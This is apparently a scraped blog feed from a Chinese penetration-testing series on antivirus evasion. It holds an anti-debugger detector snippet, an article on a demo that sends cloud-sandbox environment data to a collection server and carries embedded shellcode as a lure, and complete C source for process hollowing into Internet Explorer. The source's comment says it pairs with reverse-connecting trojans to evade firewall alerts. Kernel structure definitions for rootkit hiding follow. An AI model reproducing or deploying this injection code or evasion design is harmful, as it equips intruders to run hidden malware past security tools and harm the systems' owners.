lpOldHandler=(DWORD)lpSetUnhandledExceptionFilter(TopUnhandledExceptionFilterHBP);_asm{mov   NewEip,offset safe //方式二，更简单int   3mov   isDebuggedHBP,1 //调试时可能也不会触发异常去检测硬件断点safe:}if(1==isDebuggedHBP){AfxMessageBox("发现OD");}else{AfxMessageBox("没有OD");}}//********************************************************void CDetectODDlg::OnCancel() {// TODO: Add extra cleanup hereCDialog::OnCancel();}void CAboutDlg::OnMypage() {// TODO: Add your control notification handler code here::ShellExecute(NULL,"open","http://ucooper.com",NULL,NULL,SW_SHOWNORMAL);}void CDetectODDlg::OnAbout() {// TODO: Add your control notification handler code hereCAboutDlg dlg;dlg.DoModal();}void CAboutDlg::OnMouseMove(UINT nFlags, CPoint point) {// TODO: Add your message handler code here and/or call defaultCRect rect(60,20,100,100);if(rect.PtInRect(point)){SetClassLong(m_hWnd,GCL_HCURSOR,(LONG)(LoadCursor(NULL,IDC_HELP)));}else{SetClassLong(m_hWnd,GCL_HCURSOR,(LONG)(LoadCursor(AfxGetApp()-&gt;m_hInstance,IDC_ARROW)));}CDialog::OnMouseMove(nFlags, point);}BOOL CAboutDlg::OnInitDialog() {CDialog::OnInitDialog();// TODO: Add extra initialization hereSetClassLong(m_hWnd,GCL_HICON,(LONG)(LoadIcon(AfxGetApp()-&gt;m_hInstance,MAKEINTRESOURCE(IDI_DOG))));return TRUE;  // return TRUE unless you set the focus to a control              // EXCEPTION: OCX Property Pages should return FALSE}void CDetectODDlg::OnOK() {// TODO: Add extra validation hereCDialog::OnOK();}void CAboutDlg::OnComeon() {// TODO: Add your control notification handler code here::ShellExecute(NULL,"open","http://ucooper.com",NULL,NULL,SW_SHOWNORMAL);}void CAboutDlg::OnMyicon() {// TODO: Add your control notification handler code here::ShellExecute(NULL,"open","http://ucooper.com",NULL,NULL,SW_SHOWNORMAL);}void CDetectODDlg::OnMypage2() {// TODO: Add your control notification handler code here::ShellExecute(NULL,"open","http://ucooper.com",NULL,NULL,SW_SHOWNORMAL);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.34-dong-tai-yun-sha-xiang-de-yuan-li-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.34-dong-tai-yun-sha-xiang-de-yuan-li-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="动态云沙箱的原理"><a href="#动态云沙箱的原理" class="headerlink" title="动态云沙箱的原理"></a>动态云沙箱的原理</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1657076355048/a1ec07cdecf345b8b9436bc37e3fe054.png" alt="image.png">在现代攻防实战中，云端的动态沙箱往往在恶意软件识别中占有重要地位，作为红队也经常头疼于刚写好的免杀客户端就被云沙箱抓到恶意特征。在学习了多个反沙箱开源项目的代码后，发现大部分的反沙箱项目都是针对沙箱环境的特征进行排查，收集足够多而准确的沙箱特征是重点，便产生了动手写一个针对动态云沙箱的主动探测 demo 的想法，主动的去探测并且向外传输云沙箱的环境特征。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1657076355048/69c943d723fc490ab5a91c9f22e02046.png" alt="image.png"></p><p>如何实现 demo ？</p><p>首先，现代沙箱都是 纯黑盒程序 ，扔进一个文件，输出一个结果，而且还在云端部署，无法对其进行逆向分析定位特征，只能通过扔进去运行的程序主动收集并传出相关环境信息。</p><p>这个 demo 共分为七个部分：</p><p>第一个部分是检查沙箱的出网情况，由于本 demo 的初衷是为了研究C2客户端的反沙箱方式，所以对于内部不出网的云沙箱直接阻止程序运行。</p><p>第二部分为沙箱基础环境收集，最开始是锚定了：用户名、文件名、进程数、主机名、C盘大小四个因素，后来又加入了绝对路径的探测。</p><p>注：在与群友沟通后，又提供了@xrayteam（dns 缓存，arp 缓存探测）；@haya （麦克风探测）的想法，感谢！</p><p>第三部分是信息传出，对收集的数据进行异或和 base64 后以 http(s) 请求发送到指定的 server 进行接收，此处为了方便采用的是 GET 请求方式。</p><p>第四部分为 server 端，这里写的比较粗糙，采用 flask 框架，主要功能是对于第一个出网探测包进行回应以及接受传出数据并写入文件。</p><p>第五个部分是对于文件数据的解码脚本，把密文数据解码为明文并转换为更易于分析的 json 格式。</p><p>第六个部分为数据分析，这也是最为重要并且目前最欠缺的部分，由于个人能力的限制，只做到了单类型信息的提取，并未做到信息之间的关联分析。此处后续可借鉴威胁情报中的 IOC 的部分分析思路。</p><p>第七个部分为恶意诱饵，在检测器中硬编码恶意 shellcode ，作用是引诱云沙箱对样本进行主动运行。</p><p>把 demo 完成后扔到各大沙箱，virustotal，各大杀软云检测平台进行检测并等待数据传出，在测试几天的过程中一共收到了401个沙箱环境样本去重数据。</p><p>注：这一步骤是可以做成自动化的，即定时任务自动生成恶意样本，自动对接api提交样本，自动提取特征文件并去重添加，由于时间仓促并未能实现。</p><p>粗略的特征提取过滤结果如下图所示：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1657076355048/ee1b913e4b7f4efe95d7c5312d3a7051.png" alt="image.png"></p><p><a href="https://github.com/timwhitez">https://github.com/timwhitez</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.33-jin-cheng-ling-lei-wei-suo-da-fa-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.33-jin-cheng-ling-lei-wei-suo-da-fa-er/</url>
      
        <content type="html"><![CDATA[<h4 id="brokenjade-at-china-com-x2F-remote-x2F-remote-dll"><a href="#brokenjade-at-china-com-x2F-remote-x2F-remote-dll" class="headerlink" title="brokenjade.at.china.com/remote/remote.dll"></a>brokenjade.at.china.com/remote/remote.dll</h4><p>brokenjade.at.china.com/remote/remote_src.zip<br>brokenjade.at.china.com/remote/rmexec.exe</p><h4 id="Rootkit-驱动隐藏-断链-from"><a href="#Rootkit-驱动隐藏-断链-from" class="headerlink" title="[Rootkit] 驱动隐藏 - 断链 from"></a>[Rootkit] 驱动隐藏 - 断链 from</h4><p><a href="https://www.cnblogs.com/LyShark/p/15018889.html">https://www.cnblogs.com/LyShark/p/15018889.html</a><br>[Rootkit] 进程隐藏 - 内存加载（寄生 &amp; 僵尸进程）from <a href="https://www.cnblogs.com/LyShark/p/15018909.html">https://www.cnblogs.com/LyShark/p/15018909.html</a></p><h4 id="直接将自身代码注入傀儡进程，不需要DLL。首先用CreateProcess来创建一个挂起的IE进程，创建时候就把它挂起。然后得到它的装载基址，使用函数ZwUnmapViewOfSection来卸载这个这个基址内存空间的数据，。再用VirtualAllocEx来个ie进程重新分配内存空间，大小为要注入程序的大小-就是自身的imagesize-。使用WriteProcessMemory重新写IE进程的基址，就是刚才分配的内存空间的地址。再用WriteProcessMemory把自己的代码写入IE的内存空间。用SetThreadContext设置下进程状态，最后使用ResumeThread继续运行IE进程。"><a href="#直接将自身代码注入傀儡进程，不需要DLL。首先用CreateProcess来创建一个挂起的IE进程，创建时候就把它挂起。然后得到它的装载基址，使用函数ZwUnmapViewOfSection来卸载这个这个基址内存空间的数据，。再用VirtualAllocEx来个ie进程重新分配内存空间，大小为要注入程序的大小-就是自身的imagesize-。使用WriteProcessMemory重新写IE进程的基址，就是刚才分配的内存空间的地址。再用WriteProcessMemory把自己的代码写入IE的内存空间。用SetThreadContext设置下进程状态，最后使用ResumeThread继续运行IE进程。" class="headerlink" title="直接将自身代码注入傀儡进程，不需要DLL。首先用CreateProcess来创建一个挂起的IE进程，创建时候就把它挂起。然后得到它的装载基址，使用函数ZwUnmapViewOfSection来卸载这个这个基址内存空间的数据，。再用VirtualAllocEx来个ie进程重新分配内存空间，大小为要注入程序的大小(就是自身的imagesize)。使用WriteProcessMemory重新写IE进程的基址，就是刚才分配的内存空间的地址。再用WriteProcessMemory把自己的代码写入IE的内存空间。用SetThreadContext设置下进程状态，最后使用ResumeThread继续运行IE进程。"></a>直接将自身代码注入傀儡进程，不需要DLL。首先用CreateProcess来创建一个挂起的IE进程，创建时候就把它挂起。然后得到它的装载基址，使用函数ZwUnmapViewOfSection来卸载这个这个基址内存空间的数据，。再用VirtualAllocEx来个ie进程重新分配内存空间，大小为要注入程序的大小(就是自身的imagesize)。使用WriteProcessMemory重新写IE进程的基址，就是刚才分配的内存空间的地址。再用WriteProcessMemory把自己的代码写入IE的内存空间。用SetThreadContext设置下进程状态，最后使用ResumeThread继续运行IE进程。</h4><pre class="line-numbers language-none"><code class="language-none">/*********************************************************************    Author:heli   Date: 2022/02/10   另一种将自己代码注入傀儡进程的方法，配合反弹木马，可绕过防火墙的    反向连接报警。 **********************************************************************/#include &lt;stdio.h&gt; #include &lt;windows.h&gt;BOOL UnloadShell(HANDLE ProcHnd, unsigned long BaseAddr);  typedef struct _ChildProcessInfo {DWORD dwBaseAddress; DWORD dwReserve; } CHILDPROCESS, *PCHILDPROCESS;BOOL FindIePath( char *IePath, int *dwBuffSize ); BOOL InjectProcess(void);DWORD GetSelfImageSize( HMODULE hModule );BOOL CreateInjectProcess( PPROCESS_INFORMATION pi, PCONTEXT pThreadCxt, CHILDPROCESS *pChildProcess );char szIePath[MAX_PATH];int main(void) { if (InjectProcess() ) {    printf("This is my a test code,made by (Polymorphours)shadow3./r/n"); } else {    MessageBox(NULL,"进程插入完成","Text",MB_OK); } return 0; }BOOL FindIePath(OUT char *IePath, OUT int *dwBuffSize) { char szSystemDir[MAX_PATH]; GetSystemDirectory(szSystemDir,MAX_PATH); szSystemDir[2] = '/0'; lstrcat(szSystemDir,"//Program Files//Internet Explorer//iexplore.exe"); lstrcpy(IePath, szSystemDir); return TRUE; }BOOL InjectProcess(void) { char szModulePath[MAX_PATH]; DWORD dwImageSize = 0; STARTUPINFO si; PROCESS_INFORMATION pi; CONTEXT ThreadCxt; DWORD *PPEB; DWORD dwWrite = 0; CHILDPROCESS stChildProcess; LPVOID lpVirtual = NULL; PIMAGE_DOS_HEADER pDosheader = NULL; PIMAGE_NT_HEADERS pVirPeHead = NULL; HMODULE hModule = NULL; ZeroMemory( szModulePath, MAX_PATH ); ZeroMemory( szIePath, MAX_PATH ); GetModuleFileName( NULL, szModulePath, MAX_PATH ); FindIePath( szIePath, NULL ); if ( lstrcmpiA( szIePath, szModulePath ) == 0 ){ //当前运行在IE空间里   return FALSE; } hModule = GetModuleHandle( NULL ); if ( hModule == NULL ) {    return FALSE; } pDosheader = (PIMAGE_DOS_HEADER)hModule; pVirPeHead = (PIMAGE_NT_HEADERS)((DWORD)hModule + pDosheader-&gt;e_lfanew); dwImageSize = GetSelfImageSize(hModule); // 以挂起模式启动一个傀儡进程,这里为了传透防火墙，使用IE进程 if ( CreateInjectProcess(&amp;pi, &amp;ThreadCxt, &amp;stChildProcess )){    printf("CHILD PID: [%d]/r/n",pi.dwProcessId);    // 卸载需要注入进程中的代码    if( UnloadShell(pi.hProcess, stChildProcess.dwBaseAddress) )   {     // 重新分配内存     lpVirtual = VirtualAllocEx(      pi.hProcess,      (LPVOID)hModule,      dwImageSize,      MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);        if( lpVirtual )     {      printf("Unmapped and Allocated Mem Success./r/n");     }   }    else    {     printf("ZwUnmapViewOfSection() failed./r/n");     return TRUE;    }      if(lpVirtual)    {     PPEB = (DWORD *)ThreadCxt.Ebx;     // 重写装载地址     WriteProcessMemory(      pi.hProcess,      &amp;PPEB[2],      &amp;lpVirtual,      sizeof(DWORD),      &amp;dwWrite);        // 写入自己进程的代码到目标进程     if ( WriteProcessMemory(      pi.hProcess,      lpVirtual,      hModule,      dwImageSize,      &amp;dwWrite) )     {      printf("image inject into process success./r/n");        ThreadCxt.ContextFlags = CONTEXT_FULL;      if ( (DWORD)lpVirtual == stChildProcess.dwBaseAddress )      {       ThreadCxt.Eax = (DWORD)pVirPeHead-&gt;OptionalHeader.ImageBase + pVirPeHead-&gt;OptionalHeader.AddressOfEntryPoint;      }      else      {       ThreadCxt.Eax = (DWORD)lpVirtual + pVirPeHead-&gt;OptionalHeader.AddressOfEntryPoint;      } #ifdef DEBUG      printf("EAX = [0x%08x]/r/n",ThreadCxt.Eax);      printf("EBX = [0x%08x]/r/n",ThreadCxt.Ebx);      printf("ECX = [0x%08x]/r/n",ThreadCxt.Ecx);      printf("EDX = [0x%08x]/r/n",ThreadCxt.Edx);      printf("EIP = [0x%08x]/r/n",ThreadCxt.Eip); #endif      SetThreadContext(pi.hThread, &amp;ThreadCxt);      ResumeThread(pi.hThread);     }     else     {      printf("WirteMemory Failed,code:%d/r/n",GetLastError());      TerminateProcess(pi.hProcess, 0);     }    }    else    {     printf("VirtualMemory Failed,code:%d/r/n",GetLastError());     TerminateProcess(pi.hProcess, 0);    } } return TRUE; }DWORD GetSelfImageSize(HMODULE hModule) { DWORD dwImageSize; _asm {    mov ecx,0x30    mov eax, fs:[ecx]    mov eax, [eax + 0x0c]    mov esi, [eax + 0x0c]    add esi,0x20    lodsd    mov dwImageSize,eax } return dwImageSize; }BOOL CreateInjectProcess(        PPROCESS_INFORMATION pi,        PCONTEXT pThreadCxt,        CHILDPROCESS *pChildProcess ) { STARTUPINFO si; DWORD *PPEB; DWORD read; // 使用挂起模式启动ie if( CreateProcess(    NULL,    szIePath,    NULL,    NULL,    0,    CREATE_SUSPENDED,    NULL,    NULL,    &amp;si,    pi )) {    pThreadCxt-&gt;ContextFlags = CONTEXT_FULL;    GetThreadContext(pi-&gt;hThread, pThreadCxt);      PPEB = (DWORD *)pThreadCxt-&gt;Ebx;    // 得到ie的装载基地址    ReadProcessMemory(     pi-&gt;hProcess,     &amp;PPEB[2],     (LPVOID)&amp;(pChildProcess-&gt;dwBaseAddress),     sizeof(DWORD),     &amp;read );      return TRUE; } return FALSE; }BOOL UnloadShell(HANDLE ProcHnd, unsigned long BaseAddr)   {       typedef unsigned long (__stdcall *pfZwUnmapViewOfSection)(unsigned long, unsigned long);       pfZwUnmapViewOfSection ZwUnmapViewOfSection = NULL;     BOOL res = FALSE;       HMODULE m = LoadLibrary("ntdll.dll");       if(m){           ZwUnmapViewOfSection = (pfZwUnmapViewOfSection)GetProcAddress(m, "ZwUnmapViewOfSection");           if(ZwUnmapViewOfSection)               res = (ZwUnmapViewOfSection((unsigned long)ProcHnd, BaseAddr) == 0);           FreeLibrary(m);       }       return res; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.33-jin-cheng-ling-lei-wei-suo-da-fa-san/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.33-jin-cheng-ling-lei-wei-suo-da-fa-san/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">#include "pch.h"#pragma warning(disable: 4214)#pragma warning(disable: 4057)#pragma warning(disable: 4201)#pragma warning(disable: 4267)typedef struct _LDR_DATA_TABLE_ENTRY                         // 24 elements, 0xE0 bytes (sizeof) {    /*0x000*/     struct _LIST_ENTRY InLoadOrderLinks;                     // 2 elements, 0x10 bytes (sizeof)      /*0x010*/     struct _LIST_ENTRY InMemoryOrderLinks;                   // 2 elements, 0x10 bytes (sizeof)      /*0x020*/     struct _LIST_ENTRY InInitializationOrderLinks;           // 2 elements, 0x10 bytes (sizeof)      /*0x030*/     VOID*        DllBase;    /*0x038*/     VOID*        EntryPoint;    /*0x040*/     ULONG32      SizeOfImage;    /*0x044*/     UINT8        _PADDING0_[0x4];    /*0x048*/     struct _UNICODE_STRING FullDllName;                      // 3 elements, 0x10 bytes (sizeof)      /*0x058*/     struct _UNICODE_STRING BaseDllName;                      // 3 elements, 0x10 bytes (sizeof)  }LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;typedef struct _CURDIR              // 2 elements, 0x18 bytes (sizeof) {    /*0x000*/     struct _UNICODE_STRING DosPath; // 3 elements, 0x10 bytes (sizeof)     /*0x010*/     VOID*        Handle;}CURDIR, *PCURDIR;typedef struct _RTL_USER_PROCESS_PARAMETERS                // 30 elements, 0x400 bytes (sizeof) {    /*0x000*/     ULONG32      MaximumLength;    /*0x004*/     ULONG32      Length;    /*0x008*/     ULONG32      Flags;    /*0x00C*/     ULONG32      DebugFlags;    /*0x010*/     VOID*        ConsoleHandle;    /*0x018*/     ULONG32      ConsoleFlags;    /*0x01C*/     UINT8        _PADDING0_[0x4];    /*0x020*/     VOID*        StandardInput;    /*0x028*/     VOID*        StandardOutput;    /*0x030*/     VOID*        StandardError;    /*0x038*/     struct _CURDIR CurrentDirectory;                       // 2 elements, 0x18 bytes (sizeof)       /*0x050*/     struct _UNICODE_STRING DllPath;                        // 3 elements, 0x10 bytes (sizeof)       /*0x060*/     struct _UNICODE_STRING ImagePathName;                  // 3 elements, 0x10 bytes (sizeof)       /*0x070*/     struct _UNICODE_STRING CommandLine;                    // 3 elements, 0x10 bytes (sizeof)       /*0x080*/     VOID*        Environment;    /*0x088*/     ULONG32      StartingX;    /*0x08C*/     ULONG32      StartingY;    /*0x090*/     ULONG32      CountX;    /*0x094*/     ULONG32      CountY;    /*0x098*/     ULONG32      CountCharsX;    /*0x09C*/     ULONG32      CountCharsY;    /*0x0A0*/     ULONG32      FillAttribute;    /*0x0A4*/     ULONG32      WindowFlags;    /*0x0A8*/     ULONG32      ShowWindowFlags;    /*0x0AC*/     UINT8        _PADDING1_[0x4];    /*0x0B0*/     struct _UNICODE_STRING WindowTitle;                    // 3 elements, 0x10 bytes (sizeof)       /*0x0C0*/     struct _UNICODE_STRING DesktopInfo;                    // 3 elements, 0x10 bytes (sizeof)       /*0x0D0*/     struct _UNICODE_STRING ShellInfo;                      // 3 elements, 0x10 bytes (sizeof)       /*0x0E0*/     struct _UNICODE_STRING RuntimeData;                    // 3 elements, 0x10 bytes (sizeof)   }RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;typedef struct _PEB_LDR_DATA                            // 9 elements, 0x58 bytes (sizeof) {    /*0x000*/     ULONG32      Length;    /*0x004*/     UINT8        Initialized;    /*0x005*/     UINT8        _PADDING0_[0x3];    /*0x008*/     VOID*        SsHandle;    /*0x010*/     struct _LIST_ENTRY InLoadOrderModuleList;           // 2 elements, 0x10 bytes (sizeof)     /*0x020*/     struct _LIST_ENTRY InMemoryOrderModuleList;         // 2 elements, 0x10 bytes (sizeof)     